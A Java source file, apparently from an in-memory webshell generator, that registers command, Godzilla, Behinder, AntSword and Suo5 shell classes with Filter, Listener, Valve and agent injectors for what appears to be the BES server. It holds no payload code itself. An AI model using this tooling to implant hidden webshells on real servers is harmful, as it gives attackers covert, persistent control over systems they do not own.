package com.reajason.javaweb.memshell;

import com.reajason.javaweb.memshell.bes.antsword.AntSwordValve;
import com.reajason.javaweb.memshell.bes.behinder.BehinderValve;
import com.reajason.javaweb.memshell.bes.command.CommandValve;
import com.reajason.javaweb.memshell.bes.godzilla.GodzillaValve;
import com.reajason.javaweb.memshell.bes.injector.*;
import com.reajason.javaweb.memshell.bes.suo5.Suo5Valve;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilter;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilter;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilter;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Filter;
import com.reajason.javaweb.memshell.tomcat.antsword.AntSwordListener;
import com.reajason.javaweb.memshell.tomcat.behinder.BehinderListener;
import com.reajason.javaweb.memshell.tomcat.command.CommandListener;
import com.reajason.javaweb.memshell.tomcat.godzilla.GodzillaListener;
import com.reajason.javaweb.memshell.tomcat.suo5.Suo5Listener;
import org.apache.commons.lang3.tuple.Pair;

import java.util.LinkedHashMap;
import java.util.Map;

import static com.reajason.javaweb.memshell.config.Constants.*;

/**
 * @author ReaJason
 * @since 2024/12/26
 */
public class BesShell extends AbstractShell {

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getCommandShellMap() {
        Map<String, Pair<Class<?>, Class<?>>> map = new LinkedHashMap<>();
        map.put(FILTER, Pair.of(CommandFilter.class, BesFilterInjector.class));
        map.put(LISTENER, Pair.of(CommandListener.class, BesListenerInjector.class));
        map.put(VALVE, Pair.of(CommandValve.class, BesValveInjector.class));
        map.put(AGENT_FILTER_CHAIN, Pair.of(CommandFilterChainAdvisor.class, BesFilterChainAgentInjector.class));
        map.put(AGENT_CONTEXT_VALVE, Pair.of(CommandFilterChainAdvisor.class, BesContextValveAgentInjector.class));
        return map;
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getGodzillaShellMap() {
        Map<String, Pair<Class<?>, Class<?>>> map = new LinkedHashMap<>();
        map.put(FILTER, Pair.of(GodzillaFilter.class, BesFilterInjector.class));
        map.put(LISTENER, Pair.of(GodzillaListener.class, BesListenerInjector.class));
        map.put(VALVE, Pair.of(GodzillaValve.class, BesValveInjector.class));
        map.put(AGENT_FILTER_CHAIN, Pair.of(GodzillaFilterChainAdvisor.class, BesFilterChainAgentInjector.class));
        map.put(AGENT_CONTEXT_VALVE, Pair.of(GodzillaFilterChainAdvisor.class, BesContextValveAgentInjector.class));
        return map;
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getBehinderShellMap() {
        Map<String, Pair<Class<?>, Class<?>>> map = new LinkedHashMap<>();
        map.put(FILTER, Pair.of(BehinderFilter.class, BesFilterInjector.class));
        map.put(LISTENER, Pair.of(BehinderListener.class, BesListenerInjector.class));
        map.put(VALVE, Pair.of(BehinderValve.class, BesValveInjector.class));
        map.put(AGENT_FILTER_CHAIN, Pair.of(BehinderFilterChainAdvisor.class, BesFilterChainAgentInjector.class));
        map.put(AGENT_CONTEXT_VALVE, Pair.of(BehinderFilterChainAdvisor.class, BesContextValveAgentInjector.class));
        return map;
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getSuo5ShellMap() {
        Map<String, Pair<Class<?>, Class<?>>> map = new LinkedHashMap<>();
        map.put(FILTER, Pair.of(Suo5Filter.class, BesFilterInjector.class));
        map.put(LISTENER, Pair.of(Suo5Listener.class, BesListenerInjector.class));
        map.put(VALVE, Pair.of(Suo5Valve.class, BesValveInjector.class));
        return map;
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getAntSwordShellMap() {
        Map<String, Pair<Class<?>, Class<?>>> map = new LinkedHashMap<>();
        map.put(FILTER, Pair.of(AntSwordFilter.class, BesFilterInjector.class));
        map.put(LISTENER, Pair.of(AntSwordListener.class, BesListenerInjector.class));
        map.put(VALVE, Pair.of(AntSwordValve.class, BesValveInjector.class));
        map.put(AGENT_FILTER_CHAIN, Pair.of(AntSwordFilterChainAdvisor.class, BesFilterChainAgentInjector.class));
        map.put(AGENT_CONTEXT_VALVE, Pair.of(AntSwordFilterChainAdvisor.class, BesContextValveAgentInjector.class));
        return map;
    }
}
